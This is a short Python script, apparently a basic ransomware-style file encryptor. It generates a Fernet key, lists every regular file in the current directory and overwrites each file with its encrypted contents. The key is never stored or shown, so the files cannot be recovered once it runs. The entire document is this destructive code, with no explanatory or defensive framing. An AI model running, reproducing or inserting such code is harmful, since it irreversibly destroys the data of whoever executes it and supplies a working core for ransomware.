from cryptography.fernet import Fernet
import os
files = []
key = Fernet.generate_key()
for file in os.listdir():
  if os.path.isfile(file):
    files.append(file)
for file in files:
  with open(file, "rb") as thefile:
    contents = thefile.read()
  contents_encrypted = Fernet(key).encrypt(contents)
  with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)
